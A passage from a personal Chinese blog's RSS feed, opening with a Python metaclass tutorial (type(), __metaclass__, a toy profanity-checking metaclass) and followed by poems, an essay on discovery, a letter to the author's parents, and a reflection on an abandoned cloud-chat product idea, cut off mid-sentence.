      <content:encoded><![CDATA[<p >接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在 <code>models.py</code> 中随便定义一个 <code>Model</code> 的子类，Django 便可以：</p><ul><li>获取它的字段定义，并转换成表结构</li><li>读取 <code>Meta</code> 内部类，并转化成相应的配置信息。对于特殊的 <code>Model</code>（如 <code>abstract</code>、<code>proxy</code>），还要进行相应的转换</li><li>为没有定义 <code>objects</code> 的 <code>Model</code> 加上一个默认的 <code>Manager</code></li></ul><p >开发之余，我也曾脑补过其背后的原理。曾经，我认为是这样的：</p><blockquote><p  class="noindent"> 启动时，遍历<code>models.py</code>中的所有属性，找到<code>Model</code>的子类，并对其进行上述的修改。</p></blockquote><p >当初，我还以为自己触碰到了真理，并曾将其应用到实际生产中——为 SAE 的 KVDB 写了一个类 ORM 系统。然而在实现的过程中，我明显感受到了这种方法的丑陋，而且性能并不出色（因为要遍历所有的定义模块）。</p><p >那么事实上，Django 是怎么实现的呢？</p><blockquote><p >自古以来我们制造东西的方法都是“自上而下”的，是用切削、分割、组合的方法来制造。然而，生命是自下而上地，自发地建造起来的，这个过程极为低廉。<cite>——王晋康《水星播种》</cite></p></blockquote><p >这句话揭示了生命的神奇所在：<strong>真正的生命都是由基本物质自发构成的，而非造物主流水线式的加工</strong>。</p><p >那么，如果 类 也有生命的话，对它自己的修饰就不应该由调用者来完成，而应该是<strong>自发的</strong>。</p><p >幸而，python 提供了造物主的接口——这便是 Meta Classes，或者称为“元类”。</p><h2 id="元类-是什么？">元类 是什么？</h2><p >简单说：元类就是<strong>类的类</strong>。</p><p >首先，要有一个概念：</p><h3 id="python-中，一切都是对象。">python 中，一切都是对象。</h3><p >没错，一切，包括 类 本身。</p><p >既然，类 是 对象，对象 是 类的实例，那么——类 也应该有 类 才对。</p><h3 id="类的类：type">类的类：type</h3><p >在 python 中，我们可以用<code>type</code>检测一个对象的类，如：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">type</span>(<span class="hljs-number">1</span>) <span class="hljs-comment"># &lt;type &#x27;int&#x27;&gt;</span></span><br></pre></div></div><p >如果对一个类操作呢？</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>) <span class="hljs-comment"># &lt;type &#x27;type&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>(<span class="hljs-title class_ inherited__">object</span>): <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">type</span>(MyClass) <span class="hljs-comment"># &lt;type &#x27;type&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">type</span>(<span class="hljs-built_in">type</span>) <span class="hljs-comment"># &lt;type &#x27;type&#x27;&gt;</span></span><br></pre></div></div><p >这说明：<code>type</code>其实是一个类型，所有类——包括<code>type</code>自己——的类都是<code>type</code>。</p><h3 id="type-简介">type 简介</h3><p >从 <a href="https://docs.python.org/2/library/functions.html#type">官方文档</a> 中，我们可以知道：</p><ul><li><p >和 <code>dict</code> 类似，<code>type</code> 也是一个工厂构造函数，调用其将返回 一个<code>type</code>类型的实例（即 类）。</p></li><li><p ><code>type</code> 有两个重载版本：</p><ul><li><code>type(object)</code>，即我们最常用的版本。</li><li><code>type(name, bases, dict)</code>，一个更强大的版本。通过指定 类名称（<code>name</code>）、父类列表（<code>bases</code>）和 属性字典（<code>dict</code>）动态合成一个类。</li></ul><p >  下面两个语句等价：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-title class_ inherited__">int</span>):</span><br><span class="line"></span><br><span class="line">   name = <span class="hljs-string">&#x27;my integer&#x27;</span></span><br><span class="line"></span><br><span class="line">   <span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">self, num</span>):</span><br><span class="line">       <span class="hljs-keyword">return</span> num + <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"> <span class="hljs-comment"># -------------------</span></span><br><span class="line"></span><br><span class="line"> Integer = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;Integer&#x27;</span>, (<span class="hljs-built_in">int</span>, ), {</span><br><span class="line">   <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;my integer&#x27;</span>,</span><br><span class="line">   <span class="hljs-string">&#x27;increase&#x27;</span>: <span class="hljs-keyword">lambda</span> self, num: \</span><br><span class="line">                   num + <span class="hljs-number">1</span>    <span class="hljs-comment"># 很酷的写法，不是么</span></span><br><span class="line"> })</span><br></pre></div></div></li></ul><p >也就是说：<strong>类的定义过程，其实是<code>type</code>类型实例化的过程</strong>。</p><p ><strong>然而这和修饰一个已定义的类有什么关系呢？</strong></p><p >当然有啦～既然“类的定义”就是“<code>type</code>类型的初始化过程”，那其中必定会调用到<code>type</code>的构造函数 (<code>__new__()</code> 或 <code>__init__()</code>)。只要我们继承 <code>type</code>类 并修改其 <code>__new__</code>函数，在这里面动手脚就可以啦。</p><p >接下来我们将通过一个栗子感受 python 的黑魔法，不过在此之前，我们要先了解一个语法糖。</p><h3 id="__metaclass__-属性">__metaclass__ 属性</h3><p >有没觉得上面第二段示例有些鬼畜呢？它勒令程序员将类的成员写成一个字典，简直是反人类。如果我们真的是要通过修改 元类 来改变 类 的行为的话，似乎就必须采用这种方法了～～简直可怕～～</p><p >好在，<a href="https://docs.python.org/2/reference/datamodel.html?#__metaclass__">python 2.2</a> 时引进了一个语法糖：<code>__metaclass__</code>。</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-title class_ inherited__">int</span>):</span><br><span class="line"></span><br><span class="line">    __metaclass__ = IntMeta</span><br></pre></div></div><p >现在将会等价于：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">Integer = IntMeta(<span class="hljs-string">&#x27;Integer&#x27;</span>, (<span class="hljs-built_in">int</span>, ), {})</span><br></pre></div></div><p >由此一来，我们在使用传统类定义的同时，也可以使用元类啦。</p><h2 id="栗子：子类净化器">栗子：子类净化器</h2><blockquote><h4 id="需求描述">需求描述</h4><p >你是一个有语言洁癖的开发者，平时容不得别人讲一句脏话，在开发时也是如此。现在，你写出了一个非常棒的框架，并马上要将它公之于众了。不过，你的强迫症又犯了：如果你的使用者在代码中写满了脏话，怎么办？岂不是玷污了自己的纯洁？</p></blockquote><p >假如你就是这个丧心病狂的开发者，你会怎么做？</p><p >在知道元类之前，你可能会无从下手。不过，这个问题你可以用 元类 轻松解决——只要在类定义时过滤掉不干净的字眼就好了（百度贴吧的干活～～）。</p><p >我们的元类看起来会是这样的：</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"></span><br><span class="line">sensitive_words_list = [<span class="hljs-string">&#x27;asshole&#x27;</span>, <span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;shit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_sensitive_words</span>(<span class="hljs-params">string</span>):</span><br><span class="line">    <span class="hljs-string">&#x27;&#x27;&#x27;检测敏感词汇&#x27;&#x27;&#x27;</span></span><br><span class="line">    words_detected = <span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> word: word <span class="hljs-keyword">in</span> string.lower(), sensitive_words_list)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> words_detected:</span><br><span class="line">        <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&#x27;Sensitive words {0} detected in the string &quot;{1}&quot;.&#x27;</span> \</span><br><span class="line">            .<span class="hljs-built_in">format</span>(</span><br><span class="line">                <span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">&#x27;&quot;%s&quot;&#x27;</span> % s, words_detected)),</span><br><span class="line">                string</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CleanerMeta</span>(<span class="hljs-title class_ inherited__">type</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, class_name, bases, attrs</span>):</span><br><span class="line">        detect_sensitive_words(class_name) <span class="hljs-comment"># 检查类名</span></span><br><span class="line">        <span class="hljs-built_in">map</span>(detect_sensitive_words, attrs.iterkeys()) <span class="hljs-comment"># 检查属性名</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Well done! You are a polite coder!&quot;</span> <span class="hljs-comment"># 如无异常，输出祝贺消息</span></span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>(CleanerMeta, cls).__new__(cls, class_name, bases, attrs)</span><br><span class="line">        <span class="hljs-comment"># 重要！这行一定不能漏！！这回调用内建的类构造器来构造类，否则定义好的类将会变成 None</span></span><br><span class="line"></span><br></pre></div></div><p >现在，只需这样定义基类：</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">APIBase</span>(<span class="hljs-title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    __metaclass__ = CleanerMeta</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># ...</span></span><br></pre></div></div><p >那么所有 <code>APIBase</code> 的派生类都会接受安全审查（奸笑～～）：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ImAGoodBoy</span>(<span class="hljs-title class_ inherited__">APIBase</span>):</span><br><span class="line"></span><br><span class="line">    a_polite_attribute = <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># [Output] Well done! You are a polite coder!</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FuckMyBoss</span>(<span class="hljs-title class_ inherited__">APIBase</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># [Output] NameError: Sensitive words &quot;fuck&quot; detected in the string &quot;FuckMyBoss&quot;.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PretendToBePolite</span>(<span class="hljs-title class_ inherited__">APIBase</span>):</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__fuck_your_asshole</span>(<span class="hljs-params">self</span>):</span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># [Output] NameError: Sensitive words &quot;asshole&quot;, &quot;fuck&quot; detected in the string &quot;_PretendToBePolite__fuck_your_asshole&quot;.</span></span><br></pre></div></div><p >看，即使像最后一个例子中的私有属性也难逃审查，因为它们本质都是相同的。</p><p >甚至，你还可以对有问题的属性进行偷偷的修改，比如 让不文明的函数在调用时打出一行警告 等等，这里就不多说了。</p><h2 id="元类-在实际开发中的应用">元类 在实际开发中的应用</h2><p >日常开发时，元类 常用吗？</p><p >当然，Django 的 ORM 就是一个例子，大名鼎鼎的 SQLAlchemy 也用了这种黑魔法。</p><p >此外，在一些小型的库中，也有 元类 的身影。比如 <code>abc</code>（奇怪的名字～～）——这是 python 的一个内建库，用于模拟 抽象基类（Abstract Base Classes）。开发者可以使用 <code>abc.abstractmethod</code> 装饰器，将 指定了 <code>__metaclass__ = abc.ABCMeta</code> 的类的方法定义成 抽象方法，同时这个类也成了 抽象基类，抽象基类是不可实例化的。这便实现了对 抽象基类 的模拟。</p><p >倘若你也有需要动态修改类定义的需求，不妨也试试这种“黑魔法”。</p><h2 id="小结">小结</h2><ul><li>类 也是 对象，所有的类都是<code>type</code>的实例</li><li>元类（Meta Classes）是类的类</li><li><code>__metaclass__ = Meta</code> 是 <code>Meta(name, bases, dict)</code> 的 语法糖</li><li>可以通过重载元类的 <code>__new__</code> 方法，修改 类定义 的行为</li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Python/">Python</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Meta-Classes/">Meta Classes</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Magic/">Magic</category>
      
      
      <comments>https://i.hsfzxjy.site/meta-class-in-python/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>诗集</title>
      <link>https://i.hsfzxjy.site/poems/</link>
      <guid>https://i.hsfzxjy.site/poems/</guid>
      <pubDate>Mon, 30 Nov 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;2015-11-04&quot;&gt;2015-11-04&lt;/h3&gt;
&lt;p &gt;第 -206 天&lt;/p&gt;
&lt;p &gt;曾经的不屑&lt;/p&gt;
&lt;p &gt;早已如烟&lt;/p&gt;
&lt;p &gt;曾经不屑的&lt;/p&gt;
&lt;p &gt;却又沉淀&lt;/p&gt;
&lt;h3 id=&quot;2015-11-24&quot;&gt;2015-11-24&lt;/h</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="2015-11-04">2015-11-04</h3><p >第 -206 天</p><p >曾经的不屑</p><p >早已如烟</p><p >曾经不屑的</p><p >却又沉淀</p><h3 id="2015-11-24">2015-11-24</h3><p >当能力成为本能 恰似鱼儿潜入水中</p><p >你问 何以会凫水？</p><p >鱼答 我也不知道</p><p >:-(</p><h3 id="2015-11-26">2015-11-26</h3><p >一夜的寒冷 仿佛击碎了文明</p><p >在黎明的迷雾中 人们聚集于旷野</p><p >向东方的鱼肚白祈祷 渴求着光与热</p><p >目光 狂热而虔诚</p><p >就像 他们的祖先一样</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Poem/">Poem</category>
      
      
      <comments>https://i.hsfzxjy.site/poems/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>生活，需要被“发现”</title>
      <link>https://i.hsfzxjy.site/life-needs-discovery/</link>
      <guid>https://i.hsfzxjy.site/life-needs-discovery/</guid>
      <pubDate>Fri, 27 Nov 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;互联网，从当初的雨后春笋发展成为了我们生活中必不可缺的一部分——二十年，有如白驹过隙，但就是在如此短的时间中，世界已完全被网络颠覆了。&lt;/p&gt;
&lt;p &gt;网络，在方便了人们衣食住行的同时，也在悄悄地改变着人们的生活方式。外出吃饭，不必再为饭店的选择而头疼。打开搜索，指尖滑动</description>
        
      
      
      
      <content:encoded><![CDATA[<p >互联网，从当初的雨后春笋发展成为了我们生活中必不可缺的一部分——二十年，有如白驹过隙，但就是在如此短的时间中，世界已完全被网络颠覆了。</p><p >网络，在方便了人们衣食住行的同时，也在悄悄地改变着人们的生活方式。外出吃饭，不必再为饭店的选择而头疼。打开搜索，指尖滑动，一份详细的选择清单即可为我们呈现；外出远足，不必再为出行路线担忧。打开搜索，鼠标轻点，立刻可以获得网友们的“独家推荐”。身处信息时代，我们变得无所不知，在包罗万象的网络的引导下，过去的许多问题都会迎刃而解。然而——</p><p >在这个时代，我们似乎失去了什么。</p><p >足不出户即可知天下。网络中，世界变小了。但在巨量信息的冲击下，我们却愈发地感到生活的乏味。其中的原因便是：“发现”的乐趣正在流失。</p><p >过去，当世界尚未联网时。在工作之余漫步于大街小巷，偶遇一家未曾谋面的饭店你会感到惊喜。仔细品尝其中的美味，或咸或淡，皆源于自己的感受。那一刻的感受，好比发现了新大陆般令人愉悦。</p><p >曾经，当世界尚未联网时。在假日慕名拜访一座名山。没有指引，没有推荐，完全凭着感觉走。偶然踏出一条小路，通向一片未知的天地。当你站在奇山异水前，那种快感，只有亲身经历的人才能体会。</p><p >犹记得，有这样一个田园时代，人们甚至还不知道地球是圆的。那时，一山一水，都是一个世界。男耕女织，养蚕植桑。不时，在小世界中来一次探索，用双腿踏出一条路，用双眼去发现。一旦发现一处未知的角隅，便有如开拓了一片新天地——事实上，世界的拓荒，便是在人们不断的“发现”中完成的。</p><p >生活需要被“发现”。”发现“引导着我们探索新领域，而在这个过程中，我们会收获”发现“的乐趣。</p><p >只可惜，网络时代的到来，将我们淹没在了信息的洋流中。在变得全知全能的同时，我们却失去了”发现“的动力。生活，自然也变得乏味了起来。</p><p >因此，不妨偶尔离开网络，尝试去探索自己未知的领域，在”发现“的同时，拾回遗失已久的乐趣。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/life-needs-discovery/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>家书·十八岁成人礼</title>
      <link>https://i.hsfzxjy.site/letter-to-parents/</link>
      <guid>https://i.hsfzxjy.site/letter-to-parents/</guid>
      <pubDate>Sat, 17 Oct 2015 16:00:00 GMT</pubDate>
      
      <description>&lt;p &gt;事实上，截至目前，我只有十七岁，但无论年龄的多与少，今天这个特殊的日子，都有着其特殊的意义——是的，我要成人了。&lt;/p&gt;
&lt;p &gt;这里，我想先说一声谢谢。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p >事实上，截至目前，我只有十七岁，但无论年龄的多与少，今天这个特殊的日子，都有着其特殊的意义——是的，我要成人了。</p><p >这里，我想先说一声谢谢。</p><span id="more"></span><p >这两个字，一部分是对你们养育之恩的感谢。十七年的光阴，在我看来，有如白驹过隙——还未来得及怀着童心去触遍整个世界，世界奇幻的一面却已开始变得乏味。但对你们而言，我想，一定挺漫长的吧。这种体验，我没有经历过，因此我不妄下评论。但我终有一天会体味到，到了那时，或许，我也会有像你们一样的感慨。</p><p >这两个字，还有一部分，是为了感谢你们这么多年来对我默默的支持——这是精神层面的。<strong>做自己喜欢的事</strong>——这是你们常对我说的一句话。正因为有了这句话，才有了我今天在奥数方面的成绩——曾经，我喜欢数学，并一直坚持了下来。和许多同学相比，我觉得我很幸运。这份来自家庭的信任，我会好好珍惜的。</p><p >成人了，在人生轨道与时间轴交错的节点上，除了望向身后尚未远离的原点，我也想谈谈箭头所指的那边，那未知的前方。</p><p >对于未来，人在其一生中会有许多的想法——很奇怪，但也尽在情理之中——毕竟，未来的变数对想法的影响，是不可预测的，也是不可观测的。曾记得小时候，有段时间我很想当一名隐士——这是受了陶渊明的影响。在现在看来，这有些可笑，毕竟陶是为了避官场而遁世，而我却没有什么正当的理由，仿佛，就是为了隐居而隐居。更何况，这么多年来，我发现世上还是有好些东西是有趣的。凭此，隐居不值得我去尝试。</p><p >此后，随着世事变迁，我又相继有了些其他的想法。其中的每一个，在当时看来，都是自己绝妙的归宿。直到有一天，回首这一连串的想法，我发现了两个规律：其一是<strong>递变性</strong>，对未来的遐想渐渐不再天马行空，而是向现实靠近——这很自然，因为现实是有引力的，生命的第一要义是生存，在生存之上谈生活才有意义；其二是<strong>相对稳定性</strong>，即 在任何时候，我都希望，我能做，我喜欢做的事情。</p><p >于是，我认为，生活的意义，在于能做自己喜欢的事情——这也恰是你们常说的。于是，在高中伊始时，我开始做网站——这是现阶段我所喜欢的。无论是否有意义，总而言之，高中这两年我过得很快乐。而且在这过程中，我见识到了自己的工程构建能力和自学能力——顺便说说，这两年乃至可预见的将来，无论遭遇什么，我都不会患得患失，我的淡定即来源于此。因为就算有一天，生活退化成生存，只要有一定的资源，这些能力足以支撑我走下去——而我要的资源，到处都是。因此对于我，未来是未知的，但不会迷惘。</p><p >但从你们的眼中，我读出了担忧——毕竟在你们看来，我没有在干“正事”。我感到不耐烦，因为我不想背离初心；但我又感到犹豫，因为我不想伤到最亲近的人。这时的我，忽然想起了庄子的《逍遥游》，想起其论述的“万物皆有所凭借”的观点。的确，天高任鸟飞，但真要跃上云霄，还得看风的脸色。于是乎，在我的“准则”前，又多了一个条件：<strong>在理智的亲人不极力反对的情况下</strong>。</p><p >注意到，这个条件中也隐含了许多条件：毕竟，亲人，也是现实引力的一部分，是世俗的一部分。我害怕变得世俗，怕得要死，身边有太多这样的例子，同是有独立思想的少年，因现实巨大的引力坠入世俗，拼学历搏虚名，混职场谋高位，贷车贷房娶妻生娃，由此碌碌终生。一代又一代，遗传了重复的命，如俄罗斯套娃般相似得悚然，令人窒息。诚然，有些人是由于客观条件的不允许，现实引力过大，以致尚未起飞便就地湮灭，这种人是可怜的。但更多的则是由于他们某些未开化的亲人。但对于我，客观条件是允许的，因此我希望，主观条件不会构成巨大的引力，将我困于史瓦斯半径中，使我化为尘土。</p><p >陈奕迅曾有一首《任我行》，听得我潸然泪下（陈奕迅有许多粤语歌都值得细细品味，尤其是林夕作词的，推荐你们听）。事实上，我只是歌首那位“半夜离队上山”的顽童。但有一天，曾渴望品尝真正自由的我，却会开始“忌讳空山无人”，突然“害怕遥望星辰”。神仙鱼横渡大海会断魂，而人在空山中亦会无处求生——到头来，还得随着大队走，没入有如羊群的人群中。</p><p >我没有经历过，因而无法透析其中的原因，但从这首歌，我窥见了可能的未来。我不知自己何时会因现实引力落地，也许是三十岁，也许是四十岁，兴许是五十岁。但我知道，一旦轰然坠地，便难以再腾飞——除非在暮年，我又成为了一位顽童——但这需要精力，更需要勇气。因此我希望，在坠地后，我的回忆能与别人有些不同——最好，就是能像自己想的那样。迟暮之时，能够坐在黄昏中，眯眼望向残阳，任晚风吹拂脸庞，一遍遍地嗅着回忆，一次次咀嚼着曾经。我想，此生此行，亦就无憾了。</p><p >我想普通地做人，但不想做一个普通人。</p><p >就算终要回归羊群，我也要做一只有不同经历的羊。</p><p >所以，在未来，我会照着自己的兴趣做事，也许会做一些你们完全无法理解的事——我不求你们理解，毕竟我们相隔三十年。同时，我也欢迎你们来批评我，劝阻我，我会尊重你们的意见—。但有一点，一定要理性——无论是你们，还是我。</p><p >我想，这就是我要的未来。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Initiation/">Initiation</category>
      
      
      <comments>https://i.hsfzxjy.site/letter-to-parents/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>炫技？还是需求？</title>
      <link>https://i.hsfzxjy.site/hobby-or-needs/</link>
      <guid>https://i.hsfzxjy.site/hobby-or-needs/</guid>
      <pubDate>Sat, 03 Oct 2015 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 一款产品，其生命周期始于想法的萌发
但其终结，无人能预测
诚然，有些产品能够颠覆世界
但更多的，只是湮灭在残酷的市场中
甚至——
有的只是一场白日梦
连真正的出生都未曾经历&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 一款产品，其生命周期始于想法的萌发但其终结，无人能预测诚然，有些产品能够颠覆世界但更多的，只是湮灭在残酷的市场中甚至——有的只是一场白日梦连真正的出生都未曾经历</p></blockquote><h2 id="闪念">闪念</h2><p >“做一个云聊天平台。”</p><p >尽管只是一刹那的念头，我却被深深地迷住了。</p><p >一直都想拥有一款属于自己的<strong>真正</strong>的产品——所谓<strong>真正</strong>，即从设计，到开发，再到发布和运维都是自己独立完成。毕竟之前外包的社团网站，不过是练手的项目罢了，并不能给我带来足够的成就感。</p><p >几个月前，我将博客迁移到了 Github Pages，从而接触到了<strong>多说</strong>。多说 是一个社会化评论插件，通过在网页上插入代码，开发者可以将评论功能集成到自己的网站中。这个插件在国内使用十分广泛，无论是个人博客还是企业网站，随处可见它的身影。事实上，这里边已经有了些许<strong>云</strong>的概念——其本质就是 SaaS（Software as a Service）。</p><p >之前在给模联的外包网站中，我曾实现了一个网页版的聊天系统。经过了两个版本的沉淀，其功能已趋于稳定。在开发的过程中，我也积累了许多相关的技术经验——可以说，我已基本了解并掌握了“网页聊天”这个技术栈。</p><p >“那么，为什么不将网页聊天做成服务呢？”</p><p >受<strong>多说</strong>产品模式的启发，我萌发了一个想法。</p><p >“云聊天平台”，项目就此开始。</p><h2 id="设计">设计</h2><h3 id="v001alpha-社会化的聊天插件">v0.0.1(alpha) 社会化的聊天插件</h3><p >这是我最初的想法。</p><p >在这个版本中，产品的功能被定位为 <strong>交流</strong>。平台提供聊天功能的入口脚本，开发者可以利用其给网页集成聊天功能，用户可以用社交账号自由登陆聊天系统，与同时浏览该网页的其他用户交流看法。</p><p >很浓的<strong>多说</strong>的气息，不是吗？灵感出自多说，自然有着多说的影子。</p><p >这个想法很快便被否决了，原因如下：</p><ul><li><strong>交流</strong> 这个功能，现有的评论机制已经基本能满足。无论是用户与用户之间的互动，还是评论的实时更新，都已有了成功的案例。若是将其替换成聊天，并不会有多少功能上的创新，无非是增添了新鲜感罢了。风头一过，很快便会衰落。</li><li>从 Web 1.0 时代起就有了 评论 这种机制，在十几年的时间中，用户已形成了固有的使用习惯。用新的使用习惯去冲击传统，个人觉得，成功的可能性不大。</li><li>除了”吐槽“，用户也需要”分享“，这和产品的定位相悖。</li></ul><h3 id="v010final-高度可定制的云聊天平台">v0.1.0(final) 高度可定制的云聊天平台</h3><p >将产品定位仅局限在”交流“，未免太小气了些。要做，就要做大。</p><p >在最终的版本里，产品的功能被泛化。平台仅提供”聊天“的基础服务——这是可定制的服务，从用户系统，到界面都是可重写的，甚至还可以利用插件扩展其功能。聊天功能也不仅局限在网页中，开发者可以使用 WebView 实现其对 移动 App 的支持。至于聊天功能的用途，开发者可以自行决定。</p><p >有些大企业的味道了，我甚至能想象到自己赚得盆满钵满的样子。（=_=!）</p><p >确实，这是一个极好的入手点。一旦产品成型，成功的几率会很大。</p><p >接下来，便要进行一些相关的调查。</p><h2 id="调查">调查</h2><p >用 Google 查询”云聊天平台“，我发现已经有了同类的产品，而且还有不少。</p><p >其中做的不错的，莫过于 <a href="http://www.rongcloud.cn/">融云即时通讯云</a>。该产品出现于 2014 年，服务范围覆盖 Android、iOS 以及 Web 平台，功能上支持 单聊、群聊、语音视频聊天，同时也是高度可定制的。同时对于聊天、客服平台等常见的应用场景，也有完善的解决方案。如今已占有了七成以上的即时通讯市场。</p><p >此外，还有<a href="http://www.yuntongxun.com/api/im/imFunction#point_box">融联云通讯</a>。这是一家实力雄厚的企业，除了提供即时 IM 服务，还有 视频通话、呼叫中心等产品。</p><p >至于在网页客服平台领域，相关的产品简直数不胜数。它们大多都有了一定的技术积淀。</p><p >……</p><p >一番调查下来，结果是令人失望的。如果只是作为个人项目，云聊天平台 成功的可能性微乎其微。和那些大企业相比，我的技术实力无异于以卵击石。</p><p >没办法，项目的构想到此为止吧。</p><h2 id="反思-1">反思</h2><p >“颠覆性的产品”，有着宏伟的蓝图，却在动工之前便夭折了。</p><p >事后，再回想，那产品真的会是颠覆性的吗？未必。市场上已有了诸多相当成熟的同类产品，一个老旧的 idea，没有亮点的 idea，很难有立足之地。</p><p >但在那引以为傲的灵感迸发之初，我却完全不是这么想的。</p><p >对所谓“灵感”的痴迷，说到底，还是由于 Websocket 技术。2013 年那会儿，新浪云的 Channel 服务刚刚公测——这是一个基于 Websocket 协议的网页实时推送服务，模联网站的聊天系统全靠它的技术支持。</p><p >在当时看来，这项技术简直是神一般的存在。同时，业界也有人在大力宣传这项技术，声称“它会颠覆 Web 世界”。</p><p >既然是一项“颠覆世界”的技术，我自然也不肯将其局限在一个外包网站中。它应该属于一款“颠覆性”的产品。直到遇到了 多说，一个“伟大”的想法便产生了。</p><p >简而言之，这个“伟大的想法“，源自 <strong>不满足于自己所掌握的技术的应用</strong>——或者说：就是想炫技。</p><p >如果这只是一个练手的项目，倒也无可厚非。花上一两个星期将其实现出来，放到云平台上运行，再找几个朋友”体验“一下，好强心很快可以得到满足。至于项目的后续维护，你无需理会——反正，又不用靠它来吃饭。</p><p >但这不是一个 demo，是一个互联网产品，是要面向真正的用户的，是要进入市场的。</p><p >我知道，我并不是个案。还有许许多多的创业者，他们做一款产品的理由，只是他们想做这款产品——当然了，他们大部分都和我一样，在白日梦阶段便停止了。</p><p >产品，最重要的是要贴合用户的需求。真正的产品，都是先经过周密的市场调查分析，得出用户需求取向，再进行下一步的设计。而用来炫技的产品，则恰好反其道而行之：先设计产品，再去迎合市场。</p><p >也许你会说：诺基亚当年风生水起时，用户的需求取向肯定不是触屏无键盘智能手机，但乔布斯不是照样发布 iphone 吗？而且，如果没有一些特立独行的人去开发新需求，科技又怎能进步呢？</p><p >诚然，这个市场总是需要一些东西去冲击其固有的需求。乔布斯做过，扎克伯格也做过，他们在一定程度上都扭转了市场的走向。但无论是 iphone 还是 facebook，都不是因为决策者灵光一闪而诞生的。很多用户不知道自己想要什么，但产品经理可以通过分析特定领域的市场状况，“猜”出用户将来可能需要什么，并付诸于行动。当然，也有一些“极为创新”的产品，误打误撞获得了成功，但那只是极少数而已。</p><p >当然，Google 除外。公众常常能看到 Google 在干一些奇怪的事情，比如用热气球提供 wifi，开发智能眼镜、智能汽车等高端产品。这些项目有九成都是失败的，从而给人带来一种感觉：Google 